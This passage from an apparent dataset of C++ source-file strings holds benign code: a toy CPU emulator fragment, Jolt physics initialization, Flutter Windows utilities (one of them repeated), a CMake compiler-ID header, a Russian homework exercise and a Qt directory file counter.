registers.arithmetic[get_memory()[registers.ip] - 1];\n\n\t\t\t\tint8_t result = reg1 - reg2;\n\t\t\t\tregisters.flags.carry = (result < 0);\n\t\t\t\tregisters.flags.sign = ((result < 0) ? -1 : 1);\n\t\t\t\tregisters.flags.parity = ((result % 2 == 0) ? 1 : 0);\n\t\t\t\tregisters.flags.zero = (result == 0);\n\t\t\t\tregisters.flags.equal = (reg1 == reg2);\n\n\t\t\t\twhile (registers.ip < 256 && memory[registers.ip] != 0x00) registers.ip++;\n\t\t\t\t//registers.ip++;  \n\t\t\t}\n\t\t\telse {\n\t\t\t\tregisters.flags.halted = true;\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tregisters.flags.halted = true;\n\t\t}\n\t\tbreak;\n\t}\n\tcase 0x13: { // HLT\n\t\tregisters.flags.halted = true;\n\t\tbreak;\n\t}\n\t}\n\n}\n\nvoid CPU::set_memory(uint8_t new_memory[256]) {\n\tfor (int i = 0; i < 256; i++) {\n\t\tmemory[i] = new_memory[i];\n\t}\n}",
    "#include \"physics.hpp\"\n\n// The Jolt headers don't include Jolt.h. Always include Jolt.h before including any other Jolt header.\n// You can use Jolt.h in your precompiled header to speed up compilation.\n#include \"Jolt/Jolt.h\"\n#include \"Jolt/Physics/Collision/Shape/CylinderShape.h\"\n#include \"Jolt/Physics/Collision/Shape/MeshShape.h\"\n#include \"../../math/conversions.hpp\"\n#include \"Jolt/Physics/Collision/Shape/ConvexHullShape.h\"\n#include \"Jolt/Physics/Collision/Shape/CapsuleShape.h\"\n\n//// Disable common warnings triggered by Jolt, you can use JPH_SUPPRESS_WARNING_PUSH / JPH_SUPPRESS_WARNING_POP to store and restore the warning state\n//JPH_SUPPRESS_WARNINGS\n\nPhysics::Physics() {\n\tthis->initialize_engine();\n\tthis->initialize_world_objects();\n}\n\nPhysics::~Physics() {\n\tthis->clean_up_world();\n}\n\nvoid Physics::initialize_engine() {\n\tJPH::RegisterDefaultAllocator();\n\n\tJPH::Trace = TraceImpl;\n    JPH_IF_ENABLE_ASSERTS(JPH::AssertFailed = AssertFailedImpl;)\n\n    JPH::Factory::sInstance = new JPH::Factory();\n\tJPH::RegisterTypes();\n\n\t// dynamic allocation, we don't worry about the rule of three since we never copy the physics system, there is only ever one instance\n    temp_allocator = new JPH::TempAllocatorImpl(10 * 1024 * 1024);\n    job_system = new JPH::JobSystemThreadPool(JPH::cMaxPhysicsJobs, JPH::cMaxPhysicsBarriers, JPH::thread::hardware_concurrency() - 1);\n\n    physics_system.Init(cMaxBodies, cNumBodyMutexes, cMaxBodyPairs, cMaxContactConstraints, broad_phase_layer_interface, object_vs_broadphase_layer_filter, object_vs_object_layer_filter);\n\n\tbody_activation_listener = new MyBodyActivationListener();\n\tcontact_listener = new MyContactListener();\n\n    physics_system.SetBodyActivationListener(body_activation_listener);\n    physics_system.SetContactListener(contact_listener);\n\n}\n\n\n\nvoid Physics::initialize_world_objects() {\n\n    physics_system.SetGravity(JPH::Vec3(0, -9.81, 0));\n\n\tJPH::BodyInterface &body_interface = physics_system.GetBodyInterface();\n\n    JPH::Array<JPH::Vec3> vertices = fibonacci_sphere(60);\n    JPH::ConvexHullShapeSettings low_poly_ball_settings(vertices, JPH::cDefaultConvexRadius);\n    JPH::ShapeSettings::ShapeResult ball_shape_result = low_poly_ball_settings.Create();\n\n    if (!ball_shape_result.IsValid()) {\n        throw std::runtime_error(\"ball shape is invalid\");\n    }\n\n    JPH::ShapeRefC ball_shape = ball_shape_result.Get(); // We don't expect an error here, but you can check floor_shape_result for HasError() / GetError()\n\n    JPH::BodyCreationSettings ball_creation_settings(ball_shape, JPH::RVec3(5.0_r, 20.0_r, 5.0_r), JPH::Quat::sIdentity(), JPH::EMotionType::Dynamic, Layers::MOVING);\n    JPH::Body *ball = body_interface.CreateBody(ball_creation_settings); // Note that if we run out of bodies this can return nullptr\n    body_interface.AddBody(ball->GetID(), JPH::EActivation::Activate);\n    created_body_ids.push_back(ball->GetID());\n    body_interface.SetLinearVelocity(ball->GetID(), JPH::Vec3(0.0f, -5.0f, 0.0f));\n\n\tcreate_character();\n}\n\n/**\n * \\brief For every mesh in this model, we create a physics object that represents the mesh\n */\nvoid Physics::load_model_into_physics_world(Model* model) {\n\n\tJPH::BodyInterface &body_interface = physics_system.GetBodyInterface();\n\n\tfor (int i = 0; i < model->meshes.size(); i++) {\n\n\t\tMesh mesh = model->meshes[i];\n\n\t\tJPH::TriangleList triangles;\n        \n        assert(mesh.indices.size() % 3 == 0); // only contains triangles\n\t\tfor (int j = 0; j < mesh.indices.size(); j += 3) {\n\t\t\tunsigned int j1 = mesh.indices[j];\n\t\t\tunsigned int j2 = mesh.indices[j + 1];\n\t\t\tunsigned int j3 = mesh.indices[j + 2];\n\n\t\t\tglm::vec3 temp_v1 = mesh.vertices[j1].position;\n\t\t\tJPH::Float3 v1 = JPH::Float3(temp_v1.x, temp_v1.y, temp_v1.z);\n\n\t\t\tglm::vec3 temp_v2 = mesh.vertices[j2].position;\n\t\t\tJPH::Float3 v2 = JPH::Float3(temp_v2.x, temp_v2.y, temp_v2.z);\n\n\t\t\tglm::vec3 temp_v3 = mesh.vertices[j3].position;\n\t\t\tJPH::Float3 v3 = JPH::Float3(temp_v3.x, temp_v3.y, temp_v3.z);\n\n\t\t\tJPH::Triangle tri = JPH::Triangle(v1, v2, v3);\n\n\t\t\ttriangles.push_back(tri);\n\t\t}\n\n\t\tJPH::MeshShapeSettings settings = JPH::MeshShapeSettings(triangles);\n\n\t\tJPH::Ref<JPH::Shape> mesh_shape;\n\n\t\t// Create shape\n\t\tJPH::Shape::ShapeResult result = settings.Create();\n\t\tif (result.IsValid()) {\n\t\t\tmesh_shape = result.Get();\n\t\t} else {\n            throw std::runtime_error(\"couldn't get resulting shape\");\n\t\t}\n\n\t\tJPH::BodyCreationSettings mesh_settings(mesh_shape, JPH::RVec3(0.0_r, 0.0_r, 0.0_r), JPH::Quat::sIdentity(), JPH::EMotionType::Static, Layers::NON_MOVING);\n\t\tJPH::Body *mesh_body = body_interface.CreateBody(mesh_settings); // Note that if we run out of bodies this can return nullptr\n\t\tbody_interface.AddBody(mesh_body->GetID(), JPH::EActivation::DontActivate);\n\t\tcreated_body_ids.push_back(mesh_body->GetID());\n\n\t }\n}\n\n/**\n * \\brief create character controller for a user\n * \\todo do I have to account for dynamic memory? Come back when you know what ref is\n */\nvoid Physics::create_character() {\n\tJPH::Ref<JPH::Chara",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n# if defined(__INTEL_COMPILER_UPDATE)\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n# else\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n  /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__SUNPRO_CC)\n# define COMPILER_ID \"SunPro\"\n# if __SUNPRO_CC >= 0x5100\n   /* __SUNPRO_CC = 0xVRRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>12)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xFF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# else\n   /* __SUNPRO_CC = 0xVRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>8)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# endif\n\n#elif defined(__HP_aCC)\n# define COMPILER_ID \"HP\"\n  /* __HP_aCC = VVRRPP */\n# define COMPILER_VERSION_MAJOR DEC(__HP_aCC/10000)\n# define COMPILER_VERSION_MINOR DEC(__HP_aCC/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__HP_aCC     % 100)\n\n#elif defined(__DECCXX)\n# define COMPILER_ID \"Compaq\"\n  /* __DECCXX_VER = VVRRTPPPP */\n# define COMPILER_VERSION_MAJOR DEC(__DECCXX_VER/10000000)\n# define COMPILER_VERSION_MINOR DEC(__DECCXX_VER/100000  % 100)\n# define COMPILER_VERSION_PATCH DEC(__DECCXX_VER         % 10000)\n\n#elif defined(__IBMCPP__) && defined(__COMPILER_VER__)\n# define COMPILER_ID \"zOS\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__ibmxl__) && defined(__clang__)\n# define COMPILER_ID \"XLClang\"\n# define COMPILER_VERSION_MAJOR DEC(__ibmxl_version__)\n# define COMPILER_VERSION_MINOR DEC(__ibmxl_release__)\n# define COMPILER_VERSION_PATCH DEC(__ibmxl_modification__)\n# define COMPILER_VERSION_TWEAK DEC(__ibmxl_ptf_fix_level__)\n\n\n#elif defined(__IBMCPP__) && !defined(__COMPILER_VER__) && __IBMCPP__ >= 800\n# define COMPILER_ID \"XL\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP_",
    "\ufeff// Dz\u211617.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\n#include <cmath>\n\n   // \u0417\u0430\u0434\u0430\u0447\u0430 1\n   // \u0421\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u044e mean, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442\n   //\u0441\u0440\u0435\u0434\u043d\u0435\u0435 \u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u0434\u0432\u0443\u0445 \u043f\u0435\u0440\u0435\u0434\u0430\u043d\u043d\u044b\u0445 \u0432 \u043d\u0435\u0451 \u0447\u0438\u0441\u0435\u043b.\n   //\u041d\u0435 \u0437\u0430\u0431\u0443\u0434\u044c\u0442\u0435 \u043f\u0440\u043e\u0434\u0435\u043c\u043e\u043d\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0435\u0451 \u0440\u0430\u0431\u043e\u0442\u0443, \u0432\u044b\u0437\u0432\u0430\u0432\n   //\u0444\u0443\u043d\u043a\u0446\u0438\u044e \u0432 \u0431\u043b\u043e\u043a\u0435 main.\ndouble mean(double num1, double num2) {\n    return (num1 + num2) / 2; \n}\n\ndouble mean_arr(int arr[], int length) {\n    double sum = 0.0;\n    for (int i = 0; i < length; ++i) {\n        sum += arr[i];\n    }\n    return sum / length;\n}\n\nvoid powers(int N, int M) {\n    for (int i = 0; i <= M; i++) {\n        std::cout << N << \" ^ \" << i << \" = \" << pow(N, i) << std::endl;\n    }\n}\n\n\n\nint main() {\n    setlocale(LC_ALL, \"ru\");\n   \n   /*\n    double num1, num2;\n\n        std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0435\u0440\u0432\u043e\u0435 \u0447\u0438\u0441\u043b\u043e -> \";\n        std::cin >> num1;\n        std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0442\u043e\u0440\u043e\u0435 \u0447\u0438\u0441\u043b\u043e -> \";\n        std::cin >> num2;\n     \n        std::cout<<\"\u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 = \" << mean(num1, num2);\n\n    \n // \u0417\u0430\u0434\u0430\u0447\u0430 2\n //\u0421\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u044e mean_arr.\u041e\u043d\u0430 \u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442\n //\u043c\u0430\u0441\u0441\u0438\u0432 \u0438 \u0435\u0433\u043e \u0434\u043b\u0438\u043d\u0443, \u043f\u043e\u0441\u043b\u0435 \u0447\u0435\u0433\u043e \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u0441\u0440\u0435\u0434\u043d\u0435\u0435\n //\u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u0432\u0441\u0435\u0445 \u0435\u0433\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432.\n\n\n    int arr[] = { 1,2,3,4,5 };\n    int length = sizeof(arr) / sizeof(arr[0]);\n    double average = mean_arr(arr, length);\n    std::cout << \"\u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 = \" << average << \"\\n\";\n*/\n\n\n// \u0417\u0430\u0434\u0430\u0447\u0430 3\n//\u0421\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u044e powers(N, M), \u043a\u043e\u0442\u043e\u0440\u0430\u044f\n//\u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442 \u0434\u0432\u0430 \u0447\u0438\u0441\u043b\u043e\u0432\u044b\u0445 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f.\u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043e\u043b\u0436\u043d\u0430\n//\u0432\u044b\u0432\u043e\u0434\u0438\u0442\u044c \u0432 \u043a\u043e\u043d\u0441\u043e\u043b\u044c \u0432\u0441\u0435 \u0441\u0442\u0435\u043f\u0435\u043d\u0438 \u0447\u0438\u0441\u043b\u0430 N \u043e\u0442 \u0441\u0442\u0435\u043f\u0435\u043d\u0438 0 \u0434\u043e\n//\u0441\u0442\u0435\u043f\u0435\u043d\u0438 M \u0432\u043a\u043b\u044e\u0447\u0438\u0442\u0435\u043b\u044c\u043d\u043e.\n\n    int number, exponent;\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e: \";\n    std::cin >> number;\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0442\u0435\u043f\u0435\u043d\u044c: \";\n    std::cin >> exponent;\n\n    powers(number, exponent);\n   \n\n        return 0;\n    }\n\n\n    // \u0417\u0430\u043f\u0443\u0441\u043a \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: CTRL+F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u043a \u0431\u0435\u0437 \u043e\u0442\u043b\u0430\u0434\u043a\u0438\"\n// \u041e\u0442\u043b\u0430\u0434\u043a\u0430 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u043e\u0442\u043b\u0430\u0434\u043a\u0443\"\n\n// \u0421\u043e\u0432\u0435\u0442\u044b \u043f\u043e \u043d\u0430\u0447\u0430\u043b\u0443 \u0440\u0430\u0431\u043e\u0442\u044b \n//   1. \u0412 \u043e\u043a\u043d\u0435 \u043e\u0431\u043e\u0437\u0440\u0435\u0432\u0430\u0442\u0435\u043b\u044f \u0440\u0435\u0448\u0435\u043d\u0438\u0439 \u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u0438 \u0443\u043f\u0440\u0430\u0432\u043b\u044f\u0442\u044c \u0438\u043c\u0438.\n//   2. \u0412 \u043e\u043a\u043d\u0435 Team Explorer \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f \u043a \u0441\u0438\u0441\u0442\u0435\u043c\u0435 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0432\u0435\u0440\u0441\u0438\u044f\u043c\u0438.\n//   3. \u0412 \u043e\u043a\u043d\u0435 \"\u0412\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u0432\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0441\u0431\u043e\u0440\u043a\u0438 \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f.\n//   4. \u0412 \u043e\u043a\u043d\u0435 \"\u0421\u043f\u0438\u0441\u043e\u043a \u043e\u0448\u0438\u0431\u043e\u043a\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u043e\u0448\u0438\u0431\u043a\u0438.\n//   5. \u041f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043d\u043e\u0432\u044b\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430, \u0438\u043b\u0438 \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0432 \u043f\u0440\u043e\u0435\u043a\u0442 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0435 \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430.\n//   6. \u0427\u0442\u043e\u0431\u044b \u0441\u043d\u043e\u0432\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u044c \u044d\u0442\u043e\u0442 \u043f\u0440\u043e\u0435\u043a\u0442 \u043f\u043e\u0437\u0436\u0435, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u0424\u0430\u0439\u043b\" > \"\u041e\u0442\u043a\u0440\u044b\u0442\u044c\" > \"\u041f\u0440\u043e\u0435\u043a\u0442\" \u0438 \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 SLN-\u0444\u0430\u0439\u043b.\n",
    "#include <QCoreApplication>\n#include <QFile>\n#include <QDebug>\n#include <QDir>\n#include <QProcess>\n\nint countFilesInDirectory(const QString &path) {\n    QDir dir(path);\n    int count = 0;\n\n    // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0444\u0438\u043b\u044c\u0442\u0440 \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430 \u0432\u0441\u0435\u0445 \u0444\u0430\u0439\u043b\u043e\u0432 \u0438 \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u0439, \u0438\u0441\u043a\u043b\u044e\u0447\u0430\u044f \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0435 \u043f\u0430\u043f\u043a\u0438 \".\" \u0438 \"..\"\n    dir.setFilter(QDir::Files | QDir::Dirs | QDir::NoDotAndDotDot);\n\n    // \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0441\u043f\u0438\u0441\u043e\u043a \u0432\u0441\u0435\u0445 \u0444\u0430\u0439\u043b\u043e\u0432 \u0438 \u043f\u0430\u043f\u043e\u043a\n    QFileInfoList list = dir.entryInfoList();\n\n    for (int i = 0; i < list.size(); ++i) {\n        QFileInfo fileInfo = list.at(i);\n        if (fileInfo.isDir()) {\n            // \u0415\u0441\u043b\u0438 \u044d\u0442\u043e \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f, \u0440\u0435\u043a\u0443\u0440\u0441\u0438\u0432\u043d\u043e \u0432\u044b\u0437\u044b\u0432\u0430\u0435\u043c \u0444\u0443\u043d\u043a\u0446\u0438\u044e\n            count += countFilesInDirectory(fileInfo.absoluteFilePath());\n        } else {\n            // \u0415\u0441\u043b\u0438 \u044d\u0442\u043e \u0444\u0430\u0439\u043b, \u0443\u0432\u0435\u043b\u0438\u0447\u0438\u0432\u0430\u0435\u043c \u0441\u0447\u0435\u0442\u0447\u0438\u043a\n            ++count;\n        }\n    }\n\n    return count;\n}\n\n\nQVector<QString> getAllFileNames(const QString &path) {\n    QDir dir(path);\n    QVector<QString> fileNames;\n\n    // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0444\u0438\u043b\u044c\u0442\u0440 \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430 